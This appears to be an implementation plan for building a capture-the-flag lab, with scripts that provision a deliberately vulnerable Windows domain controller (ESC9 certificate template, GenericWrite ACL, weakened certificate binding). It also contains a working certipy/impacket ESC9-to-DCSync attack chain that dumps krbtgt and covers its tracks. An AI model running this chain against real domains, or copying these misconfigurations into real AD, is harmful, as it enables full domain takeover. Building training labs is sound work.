# Donerup AD Escalation (Plan 3 of 4) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Provision the real Windows AD DS + AD CS environment that Plans 1–2 have been pointing at — the `donerup.htb` domain, the user/service-account data model the mock LDAP backend already models, the `svc_ldap → svc_backup` `GenericWrite` edge, and a certificate template deliberately misconfigured for ESC9 — then prove the full ESC9 → DCSync chain works against the real DC, not a mock.

**Architecture:** A single Windows Server VM plugged into the `adlab0` bridge from Plan 2 (`10.10.20.10/24`, gateway `10.10.20.1`) is promoted to a domain controller for `donerup.htb` and also hosts an Enterprise CA. Because there's no unit-test framework for "is this certificate template vulnerable," every provisioning script here is paired with a companion PowerShell/bash **check script** that is run once *before* provisioning (expected to fail — the red state) and once *after* (expected to pass — the green state), mirroring TDD's red/green discipline as closely as infrastructure provisioning allows. The exploitation tasks (6–7) run from the attacker side over the Plan 2 pivot tunnel, using `certipy` and `impacket`, and are themselves the final verification that every prior task's misconfiguration is real and chained correctly.

**Tech Stack:** Windows Server 2022 (AD DS, AD CS), PowerShell (`ActiveDirectory`, `ADDSDeployment` modules, `dsacls`, `certutil`), `certipy`, `impacket` (`secretsdump`).

**Relationship to other plans:** Plugs into the `adlab0` bridge and `AD_VLAN_SUBNET`/`DC_IP` values defined in Plan 2's `build/network/config.env` (`2026-08-24-donerup-network-pivot.md`). Once Task 1 confirms the domain is live, the `web` container's `LDAP_MODE` env var (Plan 1, `2026-08-24-donerup-web-app.md`) should be switched from `mock` to unset/`real` so `wsgi.py`'s `get_ldap_connection_factory()` binds to the real DC via the route Plan 2 already added. Plan 4 (`2026-08-24-donerup-end-to-end.md`) replays the entire chain from recon through DCSync in one pass.

**Source spec:** `$REPO/donerup-htb-insane-design-v2.md` (v3), §7 and §8.

**Paths:** commands below use `$REPO` for this repository's checkout root.
Set it once per shell before following any task, e.g.
`REPO=~/Desktop/htb-box` (this plan was originally executed with
`REPO=/home/kal/Desktop/htb-box`).


---

## File Structure

```
htb-box/
  build/
    dc-provisioning/
      00-prep-dc.ps1                # added later - see Task 1, Step 0
      01-promote-dc.ps1
      02-create-users.ps1
      03-grant-svc-backup-acl.ps1
      04-install-adcs-esc9.ps1
      05-weaken-cert-binding.ps1
      06-place-root-flag.ps1        # added later, from Plan 4
      checks/
        check-domain.ps1
        check-users.ps1
        check-acl.ps1
        check-esc9.sh
        check-cert-binding.ps1
        check-root-flag.ps1         # added later, from Plan 4
    exploit/
      run-esc9-chain.sh
      run-esc10-check.sh            # NOT WRITTEN - see Task 7
      full-chain-replay.sh          # added later, from Plan 4
```

`run-esc10-check.sh` is listed because Task 7 calls for it, but it was never
written; Task 7 has not been executed.

`dc-provisioning/` scripts run on the DC VM itself (PowerShell, elevated). `exploit/` scripts run on the attacker box over the Plan 2 pivot tunnel (bash, `certipy`/`impacket`). `checks/check-esc9.sh` is the one check that also runs attacker-side, since `certipy` is a Linux tool with no PowerShell equivalent worth using here.

---

### Task 1: Promote the domain controller

**Files:**
- Create: `build/dc-provisioning/01-promote-dc.ps1`
- Create: `build/dc-provisioning/checks/check-domain.ps1`

- [x] **Step 1: Write the check script**

`build/dc-provisioning/checks/check-domain.ps1`:

```powershell
Import-Module ActiveDirectory -ErrorAction SilentlyContinue
$domain = Get-ADDomain -ErrorAction SilentlyContinue
if ($domain -and $domain.DNSRoot -eq "donerup.htb") {
    Write-Output "PASS: domain donerup.htb is up ($($domain.DomainMode))"
    dcdiag /q
} else {
    Write-Output "FAIL: donerup.htb domain not found"
    exit 1
}
```

- [x] **Step 0: Prepare the fresh VM**

Added after the fact. Everything this step used to describe in prose is now in
`build/dc-provisioning/00-prep-dc.ps1`, run elevated on the fresh VM:

```powershell
.\00-prep-dc.ps1
# or, when the VM has more than one NIC:
.\00-prep-dc.ps1 -LabMac '00-0C-29-69-99-10' -StrayMac '00-0C-29-69-99-06'
```

It refuses to continue on a client SKU (`Get-WindowsFeature` absent — the
mistake that cost a whole VM rebuild), sets `10.10.20.10/24` with gateway
`10.10.20.1` and DNS pointing at itself, forces the connection profile to
`Private` and adds an inbound ICMPv4 rule — without which Windows Firewall
leaves ICMP *and* 445/389/88/135/3389 filtered from Kali — runs the red-state
domain check, then renames the machine to `DC01` and reboots.

Rename before promotion, not after: renaming a live domain controller is
considerably more work.

- [x] **Step 2: Run the check against the fresh VM to confirm the red state**

On a fresh Windows Server 2022 VM with a static IP of `10.10.20.10/24`, gateway `10.10.20.1`, plugged into the `adlab0` vSwitch from Plan 2:

```powershell
.\checks\check-domain.ps1
```

Expected: `FAIL: donerup.htb domain not found` (the `ActiveDirectory` module isn't even installed yet on a fresh server).

- [x] **Step 3: Write the promotion script**

`build/dc-provisioning/01-promote-dc.ps1`:

```powershell
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

Import-Module ADDSDeployment
Install-ADDSForest `
    -DomainName "donerup.htb" `
    -DomainNetbiosName "DONERUP" `
    -InstallDns:$true `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "R00tP@ssw0rd2026!" -AsPlainText -Force) `
    -Force:$true
# The VM reboots automatically to complete promotion.
```

- [x] **Step 4: Run the promotion script and reboot**

```powershell
.\01-promote-dc.ps1
```

Expected: the VM reboots on its own partway through.

- [x] **Step 5: Run the check again to confirm the green state**

After the reboot completes, log back in and run:

```powershell
.\checks\check-domain.ps1
```

Expected: `PASS: domain donerup.htb is up (...)`.

On the real run `dcdiag /q` was **not** silent: it failed `DFSREvent` and
`SystemLog`. Both are event-log-window artefacts, not live faults, and both
age out of `dcdiag`'s 24-hour window on their own:

- `DFSREvent` - on the first boot after promotion the DFSR service starts
  before AD DS is answering, logging 6104/1202/6016. It recovers in the same
  boot (4602 "successfully initialized the SYSVOL replicated folder ...
  designated primary member", 1206 "successfully contacted domain controller").
- `SystemLog` - an unexpected-shutdown entry from a hard power-off of the VM,
  plus a VMware Tools transaction timeout during the promotion reboot.

Verify the live state instead of trusting `dcdiag` alone: `DfsrReplicatedFolderInfo.State`
must be `4` (Normal), the `SYSVOL` and `NETLOGON` shares must exist, and
`dcdiag /test:Services` and `dcdiag /test:Replications` must both be silent.

- [x] **Step 6: Commit**

```bash
cd $REPO
git add build/dc-provisioning/01-promote-dc.ps1 build/dc-provisioning/checks/check-domain.ps1
git commit -m "feat: add donerup.htb domain controller promotion script"
```

---

### Task 2: Users, service accounts, and the `info`-absence invariant

**Files:**
- Create: `build/dc-provisioning/02-create-users.ps1`
- Create: `build/dc-provisioning/checks/check-users.ps1`

- [x] **Step 1: Write the check script**

`build/dc-provisioning/checks/check-users.ps1`:

```powershell
Import-Module ActiveDirectory

$failures = 0

$admin = Get-ADUser -Identity administrator -Properties info -ErrorAction SilentlyContinue
if ($null -eq $admin) {
    Write-Output "FAIL: administrator account not found (domain not provisioned?)"
    $failures++
} elseif ($null -ne $admin.info) {
    Write-Output "FAIL: administrator.info is set to '$($admin.info)' - must be absent (spec S4.1)"
    $failures++
} else {
    Write-Output "PASS: administrator.info is absent"
}

$jdoe = Get-ADUser -Identity jdoe -Properties info -ErrorAction SilentlyContinue
if ($null -eq $jdoe) {
    Write-Output "FAIL: jdoe does not exist"
    $failures++
} elseif ($jdoe.info -eq "CorrectHorseBattery1") {
    Write-Output "PASS: jdoe.info carries the legacy credential"
} else {
    Write-Output "FAIL: jdoe.info is '$($jdoe.info)', expected CorrectHorseBattery1"
    $failures++
}

foreach ($name in @("svc_ldap", "svc_backup")) {
    if (Get-ADUser -Identity $name -ErrorAction SilentlyContinue) {
        Write-Output "PASS: $name exists"
    } else {
        Write-Output "FAIL: $name does not exist"
        $failures++
    }
}

if ($failures -gt 0) { exit 1 }
```

- [x] **Step 2: Run the check to confirm the red state**

```powershell
.\checks\check-users.ps1
```

Expected: `FAIL: administrator account not found (domain not provisioned?)` fails at the first check unless Task 1 already ran — since Task 1 has already run by this point in the plan, expect instead the `jdoe`/`svc_ldap`/`svc_backup` lines to `FAIL: ... does not exist` (three failures), confirming none of the plan's specific accounts exist yet.

- [x] **Step 3: Write the user-provisioning script**

`build/dc-provisioning/02-create-users.ps1`:

```powershell
# Stop on the first failure. Without this the script runs to completion after
# a failed OU creation, leaves the domain half-provisioned, and still exits 0 --
# which is exactly how the "Users" OU collision below went unnoticed.
$ErrorActionPreference = "Stop"

Import-Module ActiveDirectory

function New-OuIfMissing {
    param([string]$Name, [string]$Path)

    $dn = "OU=$Name,$Path"
    $existing = Get-ADOrganizationalUnit -LDAPFilter "(distinguishedName=$dn)" -ErrorAction SilentlyContinue
    if ($existing) {
        Write-Output "OU already present: $dn"
    } else {
        New-ADOrganizationalUnit -Name $Name -Path $Path
        Write-Output "created OU: $dn"
    }
}

function Test-UserExists {
    param([string]$SamAccountName)
    return $null -ne (Get-ADUser -LDAPFilter "(sAMAccountName=$SamAccountName)" -ErrorAction SilentlyContinue)
}

New-OuIfMissing -Name "Service Accounts" -Path "DC=donerup,DC=htb"

# NOT "Users": the domain root already carries the built-in CN=Users container,
# so New-ADOrganizationalUnit -Name "Users" fails with 8305 (name already in
# use). The app searches the whole subtree from dc=donerup,dc=htb, so the OU
# name is cosmetic -- it just has to not collide.
New-OuIfMissing -Name "Employees" -Path "DC=donerup,DC=htb"

# Regular migrated user - carries the legacy plaintext-equivalent
# credential in `info`, matching the mock backend in Plan 1.
if (Test-UserExists "jdoe") {
    Write-Output "jdoe already present"
} else {
    New-ADUser -Name "jdoe" `
        -SamAccountName "jdoe" `
        -Path "OU=Employees,DC=donerup,DC=htb" `
        -AccountPassword (ConvertTo-SecureString "CorrectHorseBattery1" -AsPlainText -Force) `
        -Enabled $true `
        -OtherAttributes @{ info = "CorrectHorseBattery1" }
    Write-Output "created jdoe"
}

# LDAP bind service account - the "real path" credential from Plan 1 S5's
# CHANGELOG.md hint.
if (Test-UserExists "svc_ldap") {
    Write-Output "svc_ldap already present"
} else {
    New-ADUser -Name "svc_ldap" `
        -SamAccountName "svc_ldap" `
        -Path "OU=Service Accounts,DC=donerup,DC=htb" `
        -AccountPassword (ConvertTo-SecureString "LdapBind2026!Str0ng" -AsPlainText -Force) `
        -Enabled $true `
        -PasswordNeverExpires $true
    Write-Output "created svc_ldap"
}

# Victim account for the GenericWrite edge (spec S7).
if (Test-UserExists "svc_backup") {
    Write-Output "svc_backup already present"
} else {
    New-ADUser -Name "svc_backup" `
        -SamAccountName "svc_backup" `
        -Path "OU=Service Accounts,DC=donerup,DC=htb" `
        -AccountPassword (ConvertTo-SecureString ([guid]::NewGuid().Guid) -AsPlainText -Force) `
        -Enabled $true
    Write-Output "created svc_backup"
}

# CRITICAL (spec S4.1): administrator must never receive an `info` value,
# not even an empty string - assert this explicitly rather than just
# skipping the assignment, so a future change to this script can't
# silently reintroduce it.
$adminInfo = (Get-ADUser -Identity administrator -Properties info).info
if ($null -ne $adminInfo) {
    throw "administrator has an 'info' value set - this breaks the LDAP injection path (spec S4.1)"
}
Write-Output "administrator.info confirmed absent"
```

- [x] **Step 4: Run it**

```powershell
.\02-create-users.ps1
```

Expected: one `created`/`already present` line per OU and account, then
`administrator.info confirmed absent`, with no thrown exception.

- [x] **Step 5: Run the check again to confirm the green state**

```powershell
.\checks\check-users.ps1
```

Expected: four `PASS` lines (`administrator.info`, `jdoe.info`, `svc_ldap`,
`svc_backup`), no `FAIL`.

- [x] **Step 6: Commit**

```bash
cd $REPO
git add build/dc-provisioning/02-create-users.ps1 build/dc-provisioning/checks/check-users.ps1
git commit -m "feat: provision donerup.htb users with info-absence invariant for administrator"
```

---

### Task 3: `GenericWrite` from `svc_ldap` onto `svc_backup`

**Files:**
- Create: `build/dc-provisioning/03-grant-svc-backup-acl.ps1`
- Create: `build/dc-provisioning/checks/check-acl.ps1`

- [x] **Step 1: Write the check script**

`build/dc-provisioning/checks/check-acl.ps1`:

```powershell
$aclOutput = dsacls "CN=svc_backup,OU=Service Accounts,DC=donerup,DC=htb" | Select-String "svc_ldap"
if ($aclOutput -match "GENERIC_WRITE|GW") {
    Write-Output "PASS: svc_ldap has GenericWrite on svc_backup"
} else {
    Write-Output "FAIL: no GenericWrite grant found for svc_ldap on svc_backup"
    exit 1
}
```

- [x] **Step 2: Run the check to confirm the red state**

```powershell
.\checks\check-acl.ps1
```

Expected: `FAIL: no GenericWrite grant found for svc_ldap on svc_backup`.

- [x] **Step 3: Write the ACL grant script**

`build/dc-provisioning/03-grant-svc-backup-acl.ps1`:

```powershell
# GenericWrite, not a narrow WriteProperty scoped to userPrincipalName:
# ESC9 needs the attacker to enroll a certificate AS the victim, which
# requires first hijacking the victim's identity via a shadow credential
# (a write to msDS-KeyCredentialLink). A UPN-only WriteProperty grant
# would let the UPN-swap step work but not the shadow-credential step -
# GenericWrite covers both (spec S7).
dsacls "CN=svc_backup,OU=Service Accounts,DC=donerup,DC=htb" /G "DONERUP\svc_ldap:GW"
```

- [x] **Step 4: Run it**

```powershell
.\03-grant-svc-backup-acl.ps1
```

- [x] **Step 5: Run the check again to confirm the green state**

```powershell
.\checks\check-acl.ps1
```

Expected: `PASS: svc_ldap has GenericWrite on svc_backup`.

- [x] **Step 6: Commit**

```bash
cd $REPO
git add build/dc-provisioning/03-grant-svc-backup-acl.ps1 build/dc-provisioning/checks/check-acl.ps1
git commit -m "feat: grant svc_ldap GenericWrite on svc_backup"
```

---

### Task 4: AD CS + the ESC9-vulnerable `DonerupUserAuth` template

**Files:**
- Create: `build/dc-provisioning/04-install-adcs-esc9.ps1`
- Create: `build/dc-provisioning/checks/check-esc9.sh`

- [x] **Step 1: Write the check script (runs attacker-side, over the Plan 2 tunnel)**

`build/dc-provisioning/checks/check-esc9.sh`:

```bash
#!/bin/bash
# Run from the attacker box, over the ligolo tunnel established via
# Plan 2's pivot path, using the svc_ldap credentials discovered through
# Plan 1's CHANGELOG.md migration-hint file.
set -euo pipefail
DC_IP="${1:-10.10.20.10}"
SVC_LDAP_PASSWORD="${2:?usage: check-esc9.sh <dc-ip> <svc_ldap-password>}"

certipy find -u svc_ldap -p "$SVC_LDAP_PASSWORD" -dc-ip "$DC_IP" -vulnerable -stdout \
    | tee /tmp/certipy-find.out

if grep -q "ESC9" /tmp/certipy-find.out; then
    echo "PASS: DonerupUserAuth flagged vulnerable to ESC9"
else
    echo "FAIL: certipy did not flag ESC9 - check msPKI-Enrollment-Flag and the Enroll ACL"
    exit 1
fi
```

- [x] **Step 2: Run the check to confirm the red state**

```bash
chmod +x build/dc-provisioning/checks/check-esc9.sh
./build/dc-provisioning/checks/check-esc9.sh 10.10.20.10 'LdapBind2026!Str0ng'
```

Expected: `FAIL: certipy did not flag ESC9 - check msPKI-Enrollment-Flag and the Enroll ACL` — no CA exists yet on the DC.

- [x] **Step 3: Write the AD CS + template provisioning script**

`build/dc-provisioning/04-install-adcs-esc9.ps1`:

```powershell
# Stop on the first failure. The previous version ran straight through a failed
# New-ADObject and then emitted five cascading errors against an object that had
# never been created, ending with a misleading "certutil FAILED".
$ErrorActionPreference = "Stop"

Import-Module ActiveDirectory

$templatesPath   = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=donerup,DC=htb"
$newTemplateName = "DonerupUserAuth"
$newTemplateDN   = "CN=$newTemplateName,$templatesPath"

# --- CA role -----------------------------------------------------------
Install-WindowsFeature Adcs-Cert-Authority -IncludeManagementTools | Out-Null

# Install-AdcsCertificationAuthority throws if a CA is already configured, so
# make re-runs safe: the ADCSAdministration provider reports the configured CA.
$caConfigured = $null -ne (Get-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration" `
    -Name Active -ErrorAction SilentlyContinue)
if ($caConfigured) {
    Write-Output "CA already configured, skipping Install-AdcsCertificationAuthority"
} else {
    Install-AdcsCertificationAuthority `
        -CAType EnterpriseRootCA `
        -CACommonName "Donerup-CA" `
        -KeyLength 2048 `
        -HashAlgorithmName SHA256 `
        -Force
    Write-Output "installed Enterprise Root CA 'Donerup-CA'"
}

# --- Template ----------------------------------------------------------
# Modelled on the built-in "User" template, but copying an explicit attribute
# list rather than every PropertyNames entry: a blind copy drags in nulls and
# operational attributes (instanceType, objectCategory, uSNCreated, ...) and
# New-ADObject rejects the whole hashtable with "the argument is null or an
# element of the argument collection contains a null value".
$user = Get-ADObject -SearchBase $templatesPath -LDAPFilter "(cn=User)" -Properties *
if (-not $user) { throw "built-in User certificate template not found under $templatesPath" }

$copied = @(
    "flags",
    "pKICriticalExtensions",
    "pKIDefaultCSPs",
    "pKIDefaultKeySpec",
    "pKIExpirationPeriod",
    "pKIOverlapPeriod",
    "pKIKeyUsage",
    "pKIMaxIssuingDepth",
    "msPKI-Minimal-Key-Size",
    "msPKI-Private-Key-Flag",
    "msPKI-RA-Signature"
)

$attrs = @{}
foreach ($p in $copied) {
    $v = $user.$p
    if ($null -eq $v) { throw "expected attribute '$p' is absent on the User template" }
    $attrs[$p] = $v
}

# CT_FLAG_AUTO_ENROLLMENT (0x20) on `flags` would have every domain user pull
# this certificate on its own. Players should enrol deliberately, so clear it.
$attrs["flags"] = $user.flags -band (-bnot 0x20)

# Each template needs its own OID under the forest's PKI OID arc; reusing the
# User template's would make the CA treat the two as the same template.
$oidContainer = Get-ADObject -Identity "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=donerup,DC=htb" `
    -Properties "msPKI-Cert-Template-OID" -ErrorAction SilentlyContinue
if ($oidContainer -and $oidContainer."msPKI-Cert-Template-OID") {
    $forestOid = $oidContainer."msPKI-Cert-Template-OID"
} else {
    # Fall back to the arc the built-in templates already sit on, minus their
    # trailing "<set>.<id>" pair.
    $forestOid = ($user."msPKI-Cert-Template-OID" -split "\." | Select-Object -SkipLast 3) -join "."
}
$rand = New-Object System.Random
$attrs["msPKI-Cert-Template-OID"] = "$forestOid.$($rand.Next(1000000,99999999)).$($rand.Next(1000000,99999999))"

# Schema version 2: v1 templates cannot carry msPKI-Certificate-Application-Policy,
# and certipy's ESC9 detection reads the application policy, not just the EKU.
$attrs["msPKI-Template-Schema-Version"]  = 2
$attrs["msPKI-Template-Minor-Revision"]  = 0
$attrs["revision"]                       = 100
$attrs["displayName"]                    = "Donerup User Auth"

# Client Authentication only. The User template also carries EFS
# (1.3.6.1.4.1.311.10.3.4) and Secure Email (1.3.6.1.5.5.7.3.4); neither is
# needed for the PKINIT step and Secure Email drags in the email requirement
# handled below.
$attrs["pKIExtendedKeyUsage"]                  = @("1.3.6.1.5.5.7.3.2")
$attrs["msPKI-Certificate-Application-Policy"] = @("1.3.6.1.5.5.7.3.2")

# The User template's name flag is 0xA6000000, which includes
# CT_FLAG_SUBJECT_REQUIRE_EMAIL (0x20000000) and
# CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL (0x04000000). None of the domain accounts
# have a `mail` attribute, so enrolment would fail with "The email name is
# unavailable and cannot be added to the Subject or Subject Alternate name."
# Keep only CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH (0x80000000) and
# CT_FLAG_SUBJECT_ALT_REQUIRE_UPN (0x02000000) -- the UPN in the SAN is what
# ESC9 pivots on. 0x82000000 does not fit in a signed 32-bit integer, which is
# what AD stores, hence the negative literal.
$attrs["msPKI-Certificate-Name-Flag"] = -2113929216   # 0x82000000

# THE misconfiguration (spec S7): CT_FLAG_NO_SECURITY_EXTENSION (0x00080000).
# Without the szOID_NTDS_CA_SECURITY_EXT extension the KDC falls back to
# mapping the certificate by UPN, so an attacker who can rewrite a victim's UPN
# can authenticate as whoever that UPN now points at.
$attrs["msPKI-Enrollment-Flag"] = 0x00080000

$existing = Get-ADObject -LDAPFilter "(cn=$newTemplateName)" -SearchBase $templatesPath -ErrorAction SilentlyContinue
if ($existing) {
    Write-Output "template $newTemplateName already present, updating its attributes"
    Set-ADObject -Identity $newTemplateDN -Replace $attrs
} else {
    New-ADObject -Name $newTemplateName -Type "pKICertificateTemplate" -Path $templatesPath -OtherAttributes $attrs
    Write-Output "created template $newTemplateName"
}

# --- Enrollment rights -------------------------------------------------
$enrollGuid = [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
$acl = Get-Acl -Path "AD:\$newTemplateDN"
$sid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")  # Authenticated Users
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", $enrollGuid)
$acl.AddAccessRule($ace)
Set-Acl -Path "AD:\$newTemplateDN" -AclObject $acl
Write-Output "granted Enroll to Authenticated Users on $newTemplateName"

# --- Publish to the CA -------------------------------------------------
# The CA caches the template list; without the restart certutil can publish a
# template the CA then refuses to issue against until it next starts.
& certutil -SetCATemplates "+$newTemplateName"
if ($LASTEXITCODE -ne 0) { throw "certutil -SetCATemplates failed with exit code $LASTEXITCODE" }
Restart-Service CertSvc
Write-Output "published $newTemplateName to the CA and restarted CertSvc"
```

- [x] **Step 4: Run it**

```powershell
.\04-install-adcs-esc9.ps1
```

- [x] **Step 5: Run the check again to confirm the green state**

```bash
./build/dc-provisioning/checks/check-esc9.sh 10.10.20.10 'LdapBind2026!Str0ng'
```

Expected: `certipy find` output includes `ESC9` for `DonerupUserAuth`, followed by `PASS: DonerupUserAuth flagged vulnerable to ESC9`.

- [x] **Step 6: Commit**

```bash
cd $REPO
git add build/dc-provisioning/04-install-adcs-esc9.ps1 build/dc-provisioning/checks/check-esc9.sh
git commit -m "feat: install AD CS with ESC9-vulnerable DonerupUserAuth template"
```

---

### Task 5: Weaken certificate-to-account binding enforcement

**Files:**
- Create: `build/dc-provisioning/05-weaken-cert-binding.ps1`
- Create: `build/dc-provisioning/checks/check-cert-binding.ps1`

- [x] **Step 1: Write the check script**

`build/dc-provisioning/checks/check-cert-binding.ps1`:

```powershell
$val = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
    -Name "StrongCertificateBindingEnforcement" -ErrorAction SilentlyContinue).StrongCertificateBindingEnforcement
if ($val -eq 1) {
    Write-Output "PASS: StrongCertificateBindingEnforcement is weakened to 1"
} else {
    Write-Output "FAIL: StrongCertificateBindingEnforcement is '$val', expected 1"
    exit 1
}
```

- [x] **Step 2: Run the check to confirm the red state**

```powershell
.\checks\check-cert-binding.ps1
```

Expected: `FAIL: StrongCertificateBindingEnforcement is '', expected 1` (the value is unset, meaning Windows applies its secure default of `2`).

- [x] **Step 3: Write the weakening script**

`build/dc-provisioning/05-weaken-cert-binding.ps1`:

```powershell
# ESC9 condition (spec S8.1): the DC must be in the weak/compatibility
# binding mode, not the secure default (2).
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
    -Name "StrongCertificateBindingEnforcement" -Value 1 -Type DWord
Restart-Service kdc -Force
```

- [x] **Step 4: Run it**

```powershell
.\05-weaken-cert-binding.ps1
```

- [x] **Step 5: Run the check again to confirm the green state**

```powershell
.\checks\check-cert-binding.ps1
```

Expected: `PASS: StrongCertificateBindingEnforcement is weakened to 1`.

- [x] **Step 6: Commit**

```bash
cd $REPO
git add build/dc-provisioning/05-weaken-cert-binding.ps1 build/dc-provisioning/checks/check-cert-binding.ps1
git commit -m "feat: weaken StrongCertificateBindingEnforcement for ESC9"
```

---

### Task 6: Full ESC9 → DCSync chain, run for real

**Files:**
- Create: `build/exploit/run-esc9-chain.sh`

This is the task that actually proves Tasks 1–5 chain together correctly — it's the "test" for the whole plan, run from the attacker box over the Plan 2 pivot tunnel.

- [x] **Step 1: Write the chain script**

`build/exploit/run-esc9-chain.sh`:

```bash
#!/bin/bash
# Full ESC9 -> DCSync chain, run from the attacker box over the Plan 2
# pivot tunnel. Requires svc_ldap credentials (from Plan 1's CHANGELOG.md
# hint) and certipy + impacket installed locally.
#
# NOTE: verified against the installed certipy v5.0.4 / impacket v0.13.1
# before writing this version - three corrections vs. the original draft:
#   1. `certipy shadow auto` in v5.0.4 prints `NT hash for 'svc_backup': ...`,
#      not `NT hash: ...` - the grep pattern below matches the real string.
#   2. `certipy req` names the saved .pfx from the UPN embedded in the
#      issued certificate, not from `-u`. Since the cert is requested while
#      svc_backup's UPN is swapped to `administrator`, it would otherwise
#      save as `administrator.pfx`. `-out svc_backup` pins the filename.
#   3. No step in Task 1 sets a DC computer name/hostname, so a hardcoded
#      `dc01.donerup.htb` is unestablished. The final secretsdump targets
#      $DC_IP directly instead (NTLM auth via -hashes doesn't need Kerberos
#      name resolution).
set -euo pipefail
DC_IP="${1:-10.10.20.10}"
DOMAIN="donerup.htb"
SVC_LDAP_PASSWORD="${2:?usage: run-esc9-chain.sh <dc-ip> <svc_ldap-password>}"

echo "[1/6] Compromising svc_backup via GenericWrite -> shadow credentials"
certipy shadow auto -u "svc_ldap@${DOMAIN}" -p "$SVC_LDAP_PASSWORD" \
    -account svc_backup -dc-ip "$DC_IP" | tee /tmp/esc9-shadow.out
SVC_BACKUP_HASH=$(grep -oP "NT hash for '[^']*': \K[a-f0-9]{32}" /tmp/esc9-shadow.out)

echo "[2/6] Swapping svc_backup's userPrincipalName to administrator"
certipy account update -u "svc_ldap@${DOMAIN}" -p "$SVC_LDAP_PASSWORD" \
    -user svc_backup -upn administrator -dc-ip "$DC_IP"

echo "[3/6] Enrolling as svc_backup against the ESC9-vulnerable template"
certipy req -u svc_backup -hashes ":${SVC_BACKUP_HASH}" \
    -ca Donerup-CA -template DonerupUserAuth -dc-ip "$DC_IP" -out svc_backup

echo "[4/6] Restoring svc_backup's userPrincipalName (cover tracks, spec S8.2 step 4)"
certipy account update -u "svc_ldap@${DOMAIN}" -p "$SVC_LDAP_PASSWORD" \
    -user svc_backup -upn svc_backup -dc-ip "$DC_IP"

echo "[5/6] Authenticating with the certificate - resolves to administrator via weak binding"
certipy auth -pfx svc_backup.pfx -dc-ip "$DC_IP" | tee /tmp/esc9-auth.out
ADMIN_HASH=$(grep -oP "Got hash for '[^']*administrator[^']*': \K[a-f0-9:]+" /tmp/esc9-auth.out)

echo "[6/6] DCSync"
impacket-secretsdump "${DOMAIN}/administrator@${DC_IP}" -hashes "$ADMIN_HASH" -just-dc-user krbtgt -dc-ip "$DC_IP" \
    | tee /tmp/esc9-dcsync.out

if grep -q "krbtgt:" /tmp/esc9-dcsync.out; then
    echo "PASS: DCSync recovered krbtgt - Domain Admin achieved"
else
    echo "FAIL: DCSync did not return krbtgt"
    exit 1
fi
```

- [ ] **Step 2: Run it**

```bash
chmod +x build/exploit/run-esc9-chain.sh
./build/exploit/run-esc9-chain.sh 10.10.20.10 'LdapBind2026!Str0ng'
```

Expected: all six numbered steps print output with no errors, ending in `PASS: DCSync recovered krbtgt - Domain Admin achieved`.

- [ ] **Step 3: Confirm `svc_backup`'s UPN was actually restored (no leftover trace)**

```powershell
Get-ADUser -Identity svc_backup -Properties userPrincipalName | Select userPrincipalName
```

Expected: `svc_backup@donerup.htb`, not `administrator@donerup.htb`.

- [ ] **Step 4: Commit**

```bash
cd $REPO
git add build/exploit/run-esc9-chain.sh
git commit -m "feat: add end-to-end ESC9 to DCSync exploit chain script"
```

---

### Task 7: ESC10 secondary path — isolated test, not assumed

**Files:**
- Create: `build/exploit/run-esc10-check.sh`

Per spec §8.3, ESC10 (the Schannel/`CertificateMappingMethods` variant of the same UPN-swap trick) must be verified **separately**, after ESC9 is confirmed and reverted — `StrongCertificateBindingEnforcement` (the Kerberos/PKINIT path Task 5 weakened) and `CertificateMappingMethods` (the Schannel path) can interact, so this plan does not assume both work simultaneously.

- [ ] **Step 1: Write the isolated ESC10 check script**

`build/exploit/run-esc10-check.sh`:

```bash
#!/bin/bash
# ESC10 is a secondary path via Schannel's CertificateMappingMethods
# registry value, using the same UPN-swap technique as ESC9. Run this
# ONLY after run-esc9-chain.sh has completed and svc_backup's UPN has
# been confirmed restored (Task 6, Step 3) - do not run concurrently
# with an in-progress ESC9 test.
set -euo pipefail
DC_IP="${1:-10.10.20.10}"

echo "On the DC, confirm the current CertificateMappingMethods value first:"
echo '  Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" -Name CertificateMappingMethods'
echo
echo "This is a separate build-time verification, not part of the automated"
echo "chain: repeat steps 1-3 of run-esc9-chain.sh manually, then authenticate"
echo "over LDAPS/Schannel instead of Kerberos, e.g.:"
echo "  certipy auth -pfx svc_backup.pfx -dc-ip $DC_IP -ldap-shell"
echo
echo "Record the result in this plan's Self-Review before relying on ESC10"
echo "as a redundant path - if it fails, ESC9 (Task 6) remains the primary,"
echo "confirmed path and no plan changes are needed."
```

- [ ] **Step 2: Run it and record the result**

```bash
chmod +x build/exploit/run-esc10-check.sh
./build/exploit/run-esc10-check.sh 10.10.20.10
```

Follow the printed instructions on the DC and attacker box. This step's outcome (works / doesn't work / interacts badly with ESC9) is a build-time finding, not a pass/fail gate on this plan — ESC9 (Task 6) is the primary, already-confirmed path.

- [ ] **Step 3: Commit**

```bash
cd $REPO
git add build/exploit/run-esc10-check.sh
git commit -m "docs: add isolated ESC10 verification script (secondary path, not assumed)"
```

---

## Self-Review

**Spec coverage:**
- §7 (AD enumeration, `svc_ldap → svc_backup` `GenericWrite`, why narrow `WriteProperty` isn't enough, `dsacls` grant command) → Task 3.
- §8.1 (ESC9 environment: `CT_FLAG_NO_SECURITY_EXTENSION`, `StrongCertificateBindingEnforcement=1`, Authenticated Users Enroll right) → Tasks 4, 5.
- §8.2 (intended path: shadow credential → UPN swap → enroll → UPN restore → cert auth → DCSync) → Task 6, steps 1–6 map 1:1 to the spec's six numbered steps.
- §8.3 (ESC10 must be tested separately, not assumed to coexist with ESC9) → Task 7, explicitly gated behind Task 6's completion.
